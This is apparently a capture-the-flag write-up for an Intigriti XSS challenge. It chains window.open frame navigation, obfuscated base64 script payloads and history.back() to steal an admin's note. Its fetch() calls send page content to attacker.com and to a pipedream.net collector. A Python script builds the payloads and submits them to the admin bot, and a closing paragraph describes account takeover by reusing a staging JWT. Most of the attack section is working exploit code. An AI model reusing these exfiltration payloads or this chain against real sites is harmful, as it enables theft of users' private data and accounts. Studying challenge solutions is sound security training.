<p>My solution is different from the original solution explained in the solution video, instead of serviceWorkers I used window.open method.</p>

<p>The main challenge site is not frameable due to the csp <code class="language-plaintext highlighter-rouge">frame-ancestors challenge-1122.intigriti.io</code></p>

<p><em>If you have an iframe inside an iframe from a cross origin request, the top frame can change the iframe of the other origin</em></p>

<p>Suppose abc.com has an iframe def.com and the domain abc.com can be framed by any other domain, then ghi.com domain can change the abc.com child iframe def.com location to somewhere else by framing the abc.com domain.</p>

<p>AS the main challenge site api.challenge-1122.intigriti.io can’t be framed because of csp I used window.open.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">x</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://api.challenge-1122.intigriti.io</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://evil.com</span><span class="dl">"</span>
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/31372554/205580425-cd995371-1e8a-4b2d-a712-a81386b0bbf0.png" alt="firefox_6otWGBGVos" /></p>

<p><img src="https://user-images.githubusercontent.com/31372554/205580409-0b39314a-b258-463d-8fd3-f141a2f723cb.png" alt="firefox_nhlOftP5hc" /></p>

<p>Cool I had this idea in my mind as the above scenario was working, the notes are saved in cdn.challenge-1122.intigriti.io and I have xss on cdn.challenge-1122.intigriti.io as both are same origin I should be able to full control it (access the dom properties,etc)</p>

<p>If I change the <code class="language-plaintext highlighter-rouge">x.frames[0].location</code> to the url which has xss payload and then read the previous url (which contains the note content) I would be able to solve this challenge.</p>

<p>If there was one more note in the admin’s account I could have do something like:</p>

<p>suppose the flag is in the first note so I modified the 2nd iframe url only.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">x</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://api.challenge-1122.intigriti.io</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://cdn.challenge-1122.intigriti.io/uploads/xxx?&lt;img/src='x'/onerror=stealIframe1COntent()&gt;shirley.png</span><span class="dl">"</span>


<span class="c1">//stealIframe1COntent can be</span>

<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">attacker.com/?x=</span><span class="dl">"</span><span class="o">+</span><span class="nx">x</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nb">document</span><span class="p">.</span><span class="nx">baseURI</span><span class="p">)</span> 
</code></pre></div></div>

<p>But as there was only iframe I thought what else I can do, I searched on google about how to read the previous url but all of them were telling about history.back() none of them were about being able to read the previous url.
So I came up with solution of mine</p>

<hr />

<h1 id="read-previous-url">Read previous url</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://cdn.challenge-1122.intigriti.io/uploads/xxxx?&lt;script&gt;eval(atob("ZnVuY3Rpb24gdGVzdCgpeyAKCXguZnJhbWVzWzBdLmxvY2F0aW9uID0gImh0dHBzOi8vY2RuLmNoYWxsZW5nZS0xMTIyLmludGlncml0aS5pby91cGxvYWRzL3h4eHg/PHNjcmlwdD53aW5kb3cub3BlbihhdG9iKGBhSFIwY0hNNkx5OWpaRzR1WTJoaGJHeGxibWRsTFRFeE1qSXVhVzUwYVdkeWFYUnBMbWx2TDNWd2JHOWhaSE12ZUhoNGVEODhjMk55YVhCMFBuTmxkRlJwYldWdmRYUW9abVYwWTJnb0ltaDBkSEJ6T2k4dlpXNHlZMlZzY2pkeVpYZGlkV3d1YlM1d2FYQmxaSEpsWVcwdWJtVjBMejk0UFNJcmQybHVaRzkzTG05d1pXNWxjaTVrYjJOMWJXVnVkQzVpYjJSNUxtbHVibVZ5U0ZSTlRDa3NNakF3TUNrN1BDOXpZM0pwY0hRK0xtcHdaM011Y0c1bmApKTtoaXN0b3J5LmJhY2soKTs8L3NjcmlwdD4uanBnc3MucG5nIgp9Owp4ID0gd2luZG93Lm9wZW4oImh0dHBzOi8vYXBpLmNoYWxsZW5nZS0xMTIyLmludGlncml0aS5pbyIpOwpzZXRUaW1lb3V0KHRlc3QsNTAwMCk7"))&lt;/script&gt;.jpgs.png
</code></pre></div></div>

<p>Decoding the base64 payload you will get:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">test</span><span class="p">(){</span> 
	<span class="nx">x</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://cdn.challenge-1122.intigriti.io/uploads/xxxx?&lt;script&gt;window.open(atob(`aHR0cHM6Ly9jZG4uY2hhbGxlbmdlLTExMjIuaW50aWdyaXRpLmlvL3VwbG9hZHMveHh4eD88c2NyaXB0PnNldFRpbWVvdXQoZmV0Y2goImh0dHBzOi8vZW4yY2VscjdyZXdidWwubS5waXBlZHJlYW0ubmV0Lz94PSIrd2luZG93Lm9wZW5lci5kb2N1bWVudC5ib2R5LmlubmVySFRNTCksMjAwMCk7PC9zY3JpcHQ+LmpwZ3MucG5n`));history.back();&lt;/script&gt;.jpgss.png</span><span class="dl">"</span>
<span class="p">};</span>
<span class="nx">x</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://api.challenge-1122.intigriti.io</span><span class="dl">"</span><span class="p">);</span>
<span class="nf">setTimeout</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span><span class="mi">3000</span><span class="p">);</span>
</code></pre></div></div>

<p>It basically opens the challenge site using window.open then changes the iframe location to another xss payload url, decoding it:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>

<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nf">atob</span><span class="p">(</span><span class="s2">`aHR0cHM6Ly9jZG4uY2hhbGxlbmdlLTExMjIuaW50aWdyaXRpLmlvL3VwbG9hZHMveHh4eD88c2NyaXB0PnNldFRpbWVvdXQoZmV0Y2goImh0dHBzOi8vZW4yY2VscjdyZXdidWwubS5waXBlZHJlYW0ubmV0Lz94PSIrd2luZG93Lm9wZW5lci5kb2N1bWVudC5ib2R5LmlubmVySFRNTCksMjAwMCk7PC9zY3JpcHQ+LmpwZ3MucG5n`</span><span class="p">));</span>

<span class="nx">history</span><span class="p">.</span><span class="nf">back</span><span class="p">();</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Now the iframe has this payload in it, it opens a new url with <code class="language-plaintext highlighter-rouge">window.open</code> again (this url points to another url with xss payload in it) and then it calls the method <code class="language-plaintext highlighter-rouge">history.back()</code>  (this will change the iframe location to the previous one)
The previous url is where the admin’s note is stored.</p>

<p>This is the url which was opened, the final xss payload url::</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://cdn.challenge-1122.intigriti.io/uploads/xxxx?&lt;script&gt;setTimeout(fetch("https://en2celr7rewbul.m.pipedream.net/?x="+window.opener.document.body.innerHTML),2000);&lt;/script&gt;.jpgs.png
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nf">setTimeout</span><span class="p">(</span><span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://en2celr7rewbul.m.pipedream.net/?x=</span><span class="dl">"</span><span class="o">+</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">),</span><span class="mi">2000</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">window.opener.document.body.innerHTML</code> this sends the note contents to our server (we can change it to document.baseURI, to get the whole url also)</p>

<p>I also made python script to do all this :</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">os</span>


<span class="n">random_alphanum</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">5</span><span class="p">))</span>


<span class="n">sPayload3</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">setTimeout(fetch(</span><span class="sh">"</span><span class="s">https://en2celr7rewbul.m.pipedream.net/?x=</span><span class="sh">"</span><span class="s">+window.opener.document.body.innerHTML),5000);</span><span class="sh">"""</span>

<span class="n">url3</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://cdn.challenge-1122.intigriti.io/uploads/xxxx{}?&lt;script&gt;{}&lt;/script&gt;.jpgs.png</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">random_alphanum</span><span class="p">,</span><span class="n">sPayload3</span><span class="p">)</span>

<span class="c1"># Encode the URL in base64 format
</span><span class="n">encoded_url3</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">url3</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">))</span>

<span class="c1"># Print the encoded URL
</span><span class="n">payload3</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">encoded_url3</span><span class="p">,</span><span class="sh">'</span><span class="s">UTF-8</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># generate random alphanum length 5
</span>
<span class="n">sPayload2</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">window.open(atob(`{}`));history.back();</span><span class="sh">"""</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>

<span class="n">url2</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://cdn.challenge-1122.intigriti.io/uploads/xxxx{}?&lt;script&gt;{}&lt;/script&gt;.jpgss.png</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">random_alphanum</span><span class="p">,</span><span class="n">sPayload2</span><span class="p">)</span>


<span class="n">finalPayload</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
function test()\{\{ 
	x.frames[0].location = </span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s">
\}\};
x = window.open(</span><span class="sh">"</span><span class="s">https://api.challenge-1122.intigriti.io</span><span class="sh">"</span><span class="s">);
setTimeout(test,1000);
</span><span class="sh">"""</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url2</span><span class="p">)</span>

<span class="c1"># Encode the finalPayload in base64 format
</span>
<span class="n">encoded_finalPayload</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">finalPayload</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)),</span> <span class="sh">'</span><span class="s">UTF-8</span><span class="sh">'</span><span class="p">)</span>


<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://cdn.challenge-1122.intigriti.io/uploads/xxxx{}?&lt;script&gt;eval(atob(`{}`))&lt;/script&gt;.jpgsss.png</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">random_alphanum</span><span class="p">,</span><span class="n">encoded_finalPayload</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>


<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">{}</span><span class="sh">'"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">{}</span><span class="sh">'"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>

<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">{}</span><span class="sh">'"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url2</span><span class="p">))</span>
<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">{}</span><span class="sh">'"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url2</span><span class="p">))</span>
<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">{}</span><span class="sh">'"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url2</span><span class="p">))</span>

<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">{}</span><span class="sh">'"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url3</span><span class="p">))</span>
<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">{}</span><span class="sh">'"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url3</span><span class="p">))</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Submitting the url to bot:</span><span class="sh">"</span><span class="p">)</span>
<span class="n">u</span>  <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">https://api.challenge-1122.intigriti.io/admin?url={}</span><span class="sh">'"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>

<span class="c1">#make get request to the url every 1sec
</span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">{}</span><span class="sh">'</span><span class="s"> -s</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
    <span class="c1">#print response header
</span>    <span class="c1">#print(x.headers)
</span>    <span class="n">y</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">{}</span><span class="sh">'</span><span class="s"> -s</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url2</span><span class="p">))</span>
    <span class="c1">#print(y.headers)
</span>    <span class="n">z</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">curl --path-as-is -X GET </span><span class="sh">'</span><span class="s">{}</span><span class="sh">'</span><span class="s"> -s</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url3</span><span class="p">))</span>
    <span class="c1">#print(z.headers)
</span>    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<p>script video poc:</p>

<p>{}</p>

<p>When I started writing this writeup I realised I fucking stupid I am all the above things I did weren’t required at all.
I could have simply used this poc:</p>

<p>Instead of changing the location I can simply read it</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">x</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://api.challenge-1122.intigriti.io</span><span class="dl">"</span><span class="p">);</span>
<span class="nf">setTimeout</span><span class="p">(</span><span class="nf">alert</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nb">document</span><span class="p">.</span><span class="nx">baseURI</span><span class="p">),</span><span class="mi">5000</span><span class="p">);</span>  
</code></pre></div></div>

<p>Once you have the note url you can view the message that the flag is actualli the admin’s avatar.
To find the admin’s avatar url , you need to take the username from the notes url and then register using the same on staging subdomain this will give a jwt token , use the same token on the main api subdomain and then you can access the admin acc easily (basically ato)</p>
